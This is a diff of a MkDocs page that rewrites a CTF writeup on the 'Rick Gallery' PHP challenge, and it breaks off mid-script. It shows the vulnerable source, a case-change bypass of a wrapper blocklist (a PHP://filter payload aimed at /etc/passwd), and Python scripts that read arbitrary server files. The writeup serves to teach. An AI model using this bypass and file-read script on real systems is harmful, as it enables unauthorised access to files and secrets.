@@ -84,7 +84,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#rick-gallery-ctf-web-challenge-writeup" class="md-skip">
+        <a href="#rick-gallery-the-case-sensitivity-trap" class="md-skip">
           Skip to content
         </a>
       
@@ -544,10 +544,10 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#challenge-overview" class="md-nav__link">
+  <a href="#the-gallery" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Challenge Overview
+        The Gallery
       
     </span>
   </a>
@@ -555,127 +555,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#initial-analysis" class="md-nav__link">
+  <a href="#finding-the-vulnerability" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Initial Analysis
-      
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Initial Analysis">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#source-code-review" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Source Code Review
-      
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#vulnerability-identification" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Vulnerability Identification
-      
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Vulnerability Identification">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#1-case-sensitive-filter-bypass" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        1. Case-Sensitive Filter Bypass
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#2-local-file-inclusion-lfi" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        2. Local File Inclusion (LFI)
-      
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#exploitation" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Exploitation
-      
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Exploitation">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#step-1-verify-lfi-works" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Step 1: Verify LFI Works
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#step-2-enumerate-system-files" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Step 2: Enumerate System Files
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#step-3-finding-the-flag" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Step 3: Finding the Flag
-      
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#final-exploit-script" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Final Exploit Script
+        Finding the Vulnerability
       
     </span>
   </a>
@@ -683,71 +566,43 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#key-takeaways" class="md-nav__link">
+  <a href="#testing-the-theory" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Key Takeaways
+        Testing the Theory
       
     </span>
   </a>
-  
-    <nav class="md-nav" aria-label="Key Takeaways">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#1-case-sensitivity-matters" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        1. Case-Sensitivity Matters
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#2-file_get_contents-is-dangerous" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        2. file_get_contents() is Dangerous
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#3-always-check-common-locations" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        3. Always Check Common Locations
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#4-error-based-detection" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        4. Error-Based Detection
-      
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#tools-techniques-used" class="md-nav__link">
+  <a href="#hunting-for-the-flag" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Tools &amp; Techniques Used
+        Hunting for the Flag
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#the-exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        The Exploit
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#what-i-learned" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        What I Learned
       
     </span>
   </a>
@@ -759,17 +614,6 @@
     <span class="md-ellipsis">
       
         References
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#flag" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Flag
       
     </span>
   </a>
@@ -902,10 +746,10 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#challenge-overview" class="md-nav__link">
+  <a href="#the-gallery" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Challenge Overview
+        The Gallery
       
     </span>
   </a>
@@ -913,127 +757,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#initial-analysis" class="md-nav__link">
+  <a href="#finding-the-vulnerability" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Initial Analysis
-      
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Initial Analysis">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#source-code-review" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Source Code Review
-      
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#vulnerability-identification" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Vulnerability Identification
-      
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Vulnerability Identification">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#1-case-sensitive-filter-bypass" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        1. Case-Sensitive Filter Bypass
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#2-local-file-inclusion-lfi" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        2. Local File Inclusion (LFI)
-      
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#exploitation" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Exploitation
-      
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Exploitation">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#step-1-verify-lfi-works" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Step 1: Verify LFI Works
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#step-2-enumerate-system-files" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Step 2: Enumerate System Files
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#step-3-finding-the-flag" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Step 3: Finding the Flag
-      
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#final-exploit-script" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Final Exploit Script
+        Finding the Vulnerability
       
     </span>
   </a>
@@ -1041,71 +768,43 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#key-takeaways" class="md-nav__link">
+  <a href="#testing-the-theory" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Key Takeaways
+        Testing the Theory
       
     </span>
   </a>
-  
-    <nav class="md-nav" aria-label="Key Takeaways">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#1-case-sensitivity-matters" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        1. Case-Sensitivity Matters
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#2-file_get_contents-is-dangerous" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        2. file_get_contents() is Dangerous
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#3-always-check-common-locations" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        3. Always Check Common Locations
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#4-error-based-detection" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        4. Error-Based Detection
-      
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#tools-techniques-used" class="md-nav__link">
+  <a href="#hunting-for-the-flag" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Tools &amp; Techniques Used
+        Hunting for the Flag
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#the-exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        The Exploit
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#what-i-learned" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        What I Learned
       
     </span>
   </a>
@@ -1117,17 +816,6 @@
     <span class="md-ellipsis">
       
         References
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#flag" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Flag
       
     </span>
   </a>
@@ -1167,184 +855,135 @@
   
 
 
-<h1 id="rick-gallery-ctf-web-challenge-writeup">Rick Gallery - CTF Web Challenge Writeup<a class="headerlink" href="#rick-gallery-ctf-web-challenge-writeup" title="Permanent link">&para;</a></h1>
-<h2 id="challenge-overview">Challenge Overview<a class="headerlink" href="#challenge-overview" title="Permanent link">&para;</a></h2>
-<p><strong>Challenge Name:</strong> Rick Gallery
-<strong>Category:</strong> Web
-<strong>Description:</strong> A Rick &amp; Morty themed image gallery with a hidden vulnerability</p>
-<h2 id="initial-analysis">Initial Analysis<a class="headerlink" href="#initial-analysis" title="Permanent link">&para;</a></h2>
-<p>We're given the source code of a PHP web application consisting of:
-- <code>index.php</code> - Main gallery page
-- <code>getpic.php</code> - Internal image fetcher (localhost only)
-- <code>.htaccess</code> - Restricts direct access to getpic.php
-- <code>Dockerfile</code> - Container configuration</p>
-<h3 id="source-code-review">Source Code Review<a class="headerlink" href="#source-code-review" title="Permanent link">&para;</a></h3>
-<p><strong>index.php</strong> - Key vulnerability:
-<div class="language-php highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="x">if ($_SERVER[&quot;REQUEST_METHOD&quot;] === &quot;POST&quot;) {</span>
-</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="x">    $headers = getallheaders();</span>
-</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="x">    if (!empty($headers[&quot;Image&quot;])) {</span>
-</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="x">        $raw = $headers[&quot;Image&quot;];</span>
-</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>
-</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="x">        // FILTER: Blocked protocols (ALL LOWERCASE!)</span>
-</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="x">        $blockedProtocols = [</span>
-</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="x">            &quot;http://&quot;, &quot;https://&quot;, &quot;ftp://&quot;, &quot;ftps://&quot;,</span>
-</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a><span class="x">            &quot;file://&quot;, &quot;data://&quot;, &quot;expect://&quot;, &quot;php://&quot;,</span>
-</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a><span class="x">            &quot;passwd&quot;</span>
-</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a><span class="x">        ];</span>
-</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>
-</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a><span class="x">        foreach ($blockedProtocols as $proto) {</span>
-</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a><span class="x">            if (strpos($raw, $proto) !== false) {</span>
-</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a><span class="x">                $raw = &quot;&quot;;</span>
-</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a><span class="x">                break;</span>
-</span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a><span class="x">            }</span>
-</span><span id="__span-0-18"><a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a><span class="x">        }</span>
-</span><span id="__span-0-19"><a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a>
-</span><span id="__span-0-20"><a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a><span class="x">        // FILTER: Path traversal</span>
-</span><span id="__span-0-21"><a id="__codelineno-0-21" name="__codelineno-0-21" href="#__codelineno-0-21"></a><span class="x">        if (str_contains($raw, &quot;../&quot;) || str_contains($raw, &quot;..\\&quot;)) {</span>
-</span><span id="__span-0-22"><a id="__codelineno-0-22" name="__codelineno-0-22" href="#__codelineno-0-22"></a><span class="x">            $raw = &quot;&quot;;</span>
-</span><span id="__span-0-23"><a id="__codelineno-0-23" name="__codelineno-0-23" href="#__codelineno-0-23"></a><span class="x">        }</span>
-</span><span id="__span-0-24"><a id="__codelineno-0-24" name="__codelineno-0-24" href="#__codelineno-0-24"></a><span class="x">        // ... passes $raw to internal curl request</span>
-</span><span id="__span-0-25"><a id="__codelineno-0-25" name="__codelineno-0-25" href="#__codelineno-0-25"></a><span class="x">    }</span>
-</span><span id="__span-0-26"><a id="__codelineno-0-26" name="__codelineno-0-26" href="#__codelineno-0-26"></a><span class="x">}</span>
-</span><span id="__span-0-27"><a id="__codelineno-0-27" name="__codelineno-0-27" href="#__codelineno-0-27"></a>
-</span><span id="__span-0-28"><a id="__codelineno-0-28" name="__codelineno-0-28" href="#__codelineno-0-28"></a><span class="x">// Internal request to getpic.php</span>
-</span><span id="__span-0-29"><a id="__codelineno-0-29" name="__codelineno-0-29" href="#__codelineno-0-29"></a><span class="x">$ch = curl_init(&quot;http://localhost:80/getpic.php&quot;);</span>
-</span><span id="__span-0-30"><a id="__codelineno-0-30" name="__codelineno-0-30" href="#__codelineno-0-30"></a><span class="x">curl_setopt($ch, CURLOPT_POST, true);</span>
-</span><span id="__span-0-31"><a id="__codelineno-0-31" name="__codelineno-0-31" href="#__codelineno-0-31"></a><span class="x">curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([&quot;picture_name&quot; =&gt; $selected]));</span>
-</span></code></pre></div></p>
-<p><strong>getpic.php</strong> - The actual file reader:
-<div class="language-php highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="x">$data = file_get_contents($_POST[&#39;picture_name&#39;]);</span>
-</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="x">echo base64_encode(&quot;$data&quot;);</span>
-</span></code></pre></div></p>
-<h2 id="vulnerability-identification">Vulnerability Identification<a class="headerlink" href="#vulnerability-identification" title="Permanent link">&para;</a></h2>
-<h3 id="1-case-sensitive-filter-bypass">1. Case-Sensitive Filter Bypass<a class="headerlink" href="#1-case-sensitive-filter-bypass" title="Permanent link">&para;</a></h3>
-<p>The filter blocks lowercase protocol wrappers:
-- <code>php://</code>, <code>http://</code>, <code>file://</code>, <code>data://</code>, etc.</p>
-<p><strong>Critical Discovery:</strong> PHP stream wrappers are <strong>case-insensitive</strong>!</p>
-<ul>
-<li>❌ Blocked: <code>php://</code>, <code>file://</code>, <code>http://</code></li>
-<li>✅ Bypass: <code>PHP://</code>, <code>FILE://</code>, <code>HTTP://</code></li>
-</ul>
-<h3 id="2-local-file-inclusion-lfi">2. Local File Inclusion (LFI)<a class="headerlink" href="#2-local-file-inclusion-lfi" title="Permanent link">&para;</a></h3>
-<p>Since <code>getpic.php</code> uses <code>file_get_contents()</code> on user-controlled input, and we can bypass the filter, we have arbitrary file read capability.</p>
-<h2 id="exploitation">Exploitation<a class="headerlink" href="#exploitation" title="Permanent link">&para;</a></h2>
-<h3 id="step-1-verify-lfi-works">Step 1: Verify LFI Works<a class="headerlink" href="#step-1-verify-lfi-works" title="Permanent link">&para;</a></h3>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
-</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">base64</span>
-</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>
-</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="n">TARGET</span> <span class="o">=</span> <span class="s2">&quot;http://65.109.194.105:8080/index.php&quot;</span>
-</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>
-</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="k">def</span><span class="w"> </span><span class="nf">read_file</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
-</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;Image&quot;</span><span class="p">:</span> <span class="n">path</span><span class="p">}</span>
-</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">TARGET</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
-</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a>    <span class="k">if</span> <span class="s1">&#39;&lt;br /&gt;&#39;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span> <span class="ow">or</span> <span class="s1">&#39;Warning&#39;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
-</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a>        <span class="k">return</span> <span class="kc">None</span>  <span class="c1"># File doesn&#39;t exist</span>
-</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a>    <span class="k">return</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
-</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a>
-</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a><span class="c1"># Test with absolute path (no wrapper needed)</span>
-</span><span id="__span-2-14"><a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a><span class="nb">print</span><span class="p">(</span><span class="n">read_file</span><span class="p">(</span><span class="s2">&quot;/etc/hostname&quot;</span><span class="p">))</span>
-</span><span id="__span-2-15"><a id="__codelineno-2-15" name="__codelineno-2-15" href="#__codelineno-2-15"></a><span class="c1"># Output: b&#39;7be458eda235\n&#39;</span>
+<h1 id="rick-gallery-the-case-sensitivity-trap">Rick Gallery - The Case Sensitivity Trap<a class="headerlink" href="#rick-gallery-the-case-sensitivity-trap" title="Permanent link">&para;</a></h1>
+<p><strong>Category:</strong> Web
+<strong>Flag:</strong> <code>ASIS{...}</code></p>
+<h2 id="the-gallery">The Gallery<a class="headerlink" href="#the-gallery" title="Permanent link">&para;</a></h2>
+<p>Rick Gallery was presented as a simple image gallery application with a Rick and Morty theme. When I first loaded it, I saw a collection of images and could click through them. The source code was provided, which made things easier.</p>
+<p>Looking at the PHP code, I found three main files:
+- <code>index.php</code> - The main gallery interface
+- <code>getpic.php</code> - An internal service to fetch images
+- <code>.htaccess</code> - Apache configuration restricting direct access to <code>getpic.php</code></p>
+<h2 id="finding-the-vulnerability">Finding the Vulnerability<a class="headerlink" href="#finding-the-vulnerability" title="Permanent link">&para;</a></h2>
+<p>The interesting part was in <code>index.php</code>. When processing POST requests, it checked for an <code>Image</code> header and ran it through some filters:</p>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="x">$blockedProtocols = [</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="x">    &quot;http://&quot;, &quot;https://&quot;, &quot;ftp://&quot;, &quot;ftps://&quot;,</span>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="x">    &quot;file://&quot;, &quot;data://&quot;, &quot;expect://&quot;, &quot;php://&quot;,</span>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="x">    &quot;passwd&quot;</span>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="x">];</span>
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="x">foreach ($blockedProtocols as $proto) {</span>
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="x">    if (strpos($raw, $proto) !== false) {</span>
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a><span class="x">        $raw = &quot;&quot;;</span>
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a><span class="x">        break;</span>
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a><span class="x">    }</span>
+</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a><span class="x">}</span>
 </span></code></pre></div>
-<p>✅ LFI confirmed!</p>
-<h3 id="step-2-enumerate-system-files">Step 2: Enumerate System Files<a class="headerlink" href="#step-2-enumerate-system-files" title="Permanent link">&para;</a></h3>
-<p>We searched numerous locations for the flag:
-- <code>/flag.txt</code> - Not found
-- <code>/etc/passwd</code> - Blocked by filter (contains "passwd")
-- <code>/proc/self/environ</code> - Found, but no flag reference
-- <code>/var/log/apache2/error.log</code> - No flag info
-- Various config files and logs</p>
-<h3 id="step-3-finding-the-flag">Step 3: Finding the Flag<a class="headerlink" href="#step-3-finding-the-flag" title="Permanent link">&para;</a></h3>
-<p>After extensive enumeration, the flag was found at:</p>
+<p>The application was trying to prevent me from using dangerous PHP wrappers like <code>php://</code> or <code>file://</code> to read arbitrary files. But I noticed something: all the blocked strings were lowercase.</p>
+<p>I remembered that PHP stream wrappers are case-insensitive. So while <code>php://filter/read=convert.base64-encode/resource=/etc/passwd</code> would be blocked, <code>PHP://filter/read=convert.base64-encode/resource=/etc/passwd</code> would sail right through the filter.</p>
+<h2 id="testing-the-theory">Testing the Theory<a class="headerlink" href="#testing-the-theory" title="Permanent link">&para;</a></h2>
+<p>I started with a simple test. I sent a POST request with the <code>Image</code> header set to <code>/etc/hostname</code> (no wrapper needed for absolute paths):</p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">base64</span>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="n">TARGET</span> <span class="o">=</span> <span class="s2">&quot;http://65.109.194.105:8080/index.php&quot;</span>
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;Image&quot;</span><span class="p">:</span> <span class="s2">&quot;/etc/hostname&quot;</span><span class="p">}</span>
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">TARGET</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a><span class="n">content</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
+</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a><span class="nb">print</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a><span class="c1"># Output: b&#39;7be458eda235\n&#39;</span>
+</span></code></pre></div>
+<p>It worked. The application was passing my input to <code>file_get_contents()</code> in <code>getpic.php</code>, which happily read any file I specified.</p>
+<h2 id="hunting-for-the-flag">Hunting for the Flag<a class="headerlink" href="#hunting-for-the-flag" title="Permanent link">&para;</a></h2>
+<p>Now I had local file inclusion, but I needed to find where the flag was stored. I started checking common locations:</p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="k">def</span><span class="w"> </span><span class="nf">read_file</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;Image&quot;</span><span class="p">:</span> <span class="n">path</span><span class="p">}</span>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">TARGET</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>    <span class="k">if</span> <span class="s1">&#39;&lt;br /&gt;&#39;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span> <span class="ow">or</span> <span class="s1">&#39;Warning&#39;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>        <span class="k">return</span> <span class="kc">None</span>
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>    <span class="k">return</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a><span class="c1"># Tried various paths</span>
